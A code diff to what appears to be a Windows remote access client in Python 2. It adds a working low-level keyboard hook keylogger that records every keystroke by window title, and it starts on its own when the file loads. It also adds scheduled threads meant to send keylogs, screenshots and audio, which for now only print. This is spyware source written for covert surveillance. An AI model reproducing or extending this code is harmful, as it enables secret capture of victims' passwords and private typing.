@@ -11,6 +11,7 @@ import ctypes
 from ctypes.wintypes import MSG
 import threading
 import subprocess
+import sched
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -26,6 +27,10 @@ client_version = '1.0'
 os_type = str(sys.platform)
 os_name = str(platform.platform())
 os_user = os.path.expanduser('~').split('\\')[-1]
+
+KEY_LOGS = {}
+SCREENSHOT_LOGS = {}
+AUDIO_LOGS = {}
 
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
@@ -67,7 +72,6 @@ MAX_PATH = 260
 PROCESS_TERMINATE = 0x0001
 PROCESS_QUERY_INFORMATION = 0x0400
 
-
 def init():
     if os.path.exists('info.nfo'):
         variables = open('info.nfo', 'r').read()
@@ -75,13 +79,152 @@ def init():
     else:
         variables = {
             'i': '',
+            'kts': True,
             'kt': 30,
+            'ats': False,
             'at': 30,
+            'sts': False,
             'st': 30,
         }
         open('info.nfo', 'w').write(str(variables))
         return variables
 
+# TODO: Keylogger, Scheduler
+def send_keylog():
+    global KEY_LOGS
+
+    config = init()
+    if config['kts'] and len(KEY_LOGS) > 0:
+        print KEY_LOGS
+        KEY_LOGS = {}
+    key_scheduler = sched.scheduler(time.time, time.sleep)
+    key_scheduler.enter(config['kt'], 1, send_keylog, ())
+    key_scheduler.run()
+
+def send_screenshot():
+    config = init()
+    if config['sts'] and len(SCREENSHOT_LOGS) > 0:
+        print 'SENT SCREENSHOTS'
+    screen_scheduler = sched.scheduler(time.time, time.sleep)
+    screen_scheduler.enter(config['st'], 1, send_screenshot, ())
+    screen_scheduler.run()
+
+def send_audio():
+    config = init()
+    if config['ats'] and len(AUDIO_LOGS) > 0:
+        print 'SENT AUDIO'
+    audio_scheduler = sched.scheduler(time.time, time.sleep)
+    audio_scheduler.enter(config['at'], 1, send_audio, ())
+    audio_scheduler.run()
+
+def run_scheduler():
+    key_thread = threading.Thread(target=send_keylog)
+    key_thread.start()
+    screen_thread = threading.Thread(target=send_screenshot)
+    screen_thread.start()
+    audio_thread = threading.Thread(target=send_audio)
+    audio_thread.start()
+
+shiftcodes = {
+    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
+    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
+    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
+    186: ':', 222: '"', 188: '<', 190: '>', 191: '?',
+}
+keycodes = {
+    160: '', 161: '', 32: '{{space}}',
+    9: '{{tab}}', 8: '{{del}}', 162: '', 163: '', 144: '',
+    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '<br>'
+}
+updateCode = {
+    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
+    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
+    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
+    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+    111: '/', 106: '*', 109: '-', 107: '+',
+    110: '.'
+}
+
+def update_key(k):
+    if updateCode.has_key(k):
+        return updateCode[k]
+    else:
+        return str(chr(k))
+
+
+def get_fptr(fn):
+    cmpfunc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
+    return cmpfunc(fn)
+
+class KeyLogger:
+    def __init__(self):
+        self.hooked = None
+
+    def install_hook_proc(self, pointer):
+        self.hooked = User32.SetWindowsHookExA(13, pointer, Kernel32.GetModuleHandleW(None), 0)
+        if not self.hooked:
+            return False
+        return True
+
+    def uninstall_hook_proc(self):
+        if self.hooked is None:
+            return
+        ctypes.windll.user32.UnhookWindowsHookEx(self.hooked)
+        self.hooked = None
+
+class Key(threading.Thread):
+    def __init__(self):
+        super(Key, self).__init__()
+
+        global KEY_LOGS
+
+    def write_key(self, log):
+        current_window_title = get_window_title()
+        if KEY_LOGS.has_key(current_window_title):
+            KEY_LOGS[current_window_title] += log
+        else:
+            KEY_LOGS[current_window_title] = log
+
+    def hook_proc(self, n_code, w_param, l_param):
+
+        if w_param is not 0x0100:
+            return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+        if keycodes.has_key(l_param[0]):
+            key = keycodes[l_param[0]]
+        else:
+            if User32.GetKeyState(0x14) & 1:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).lower()
+                else:
+                    key = update_key(l_param[0]).upper()
+            else:
+                if User32.GetKeyState(0x10) & 0x8000:
+                    key = shiftcodes[l_param[0]] if shiftcodes.has_key(l_param[0]) else update_key(
+                        l_param[0]).upper()
+                else:
+                    key = update_key(l_param[0]).lower()
+        self.write_key(key)
+
+        return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
+
+    def start_keylogger(self):
+        msg = MSG()
+        User32.GetMessageA(ctypes.byref(msg), 0, 0, 0)
+
+    def run(self):
+        self.keyLogger = KeyLogger()
+        self.pointer = get_fptr(self.hook_proc)
+        if self.keyLogger.install_hook_proc(self.pointer):
+            pass
+        self.start_keylogger()
+
+
+# TODO: TEMP
+run_scheduler()
+keylogger = Key()
+keylogger.start()
 
 
 def check_info():
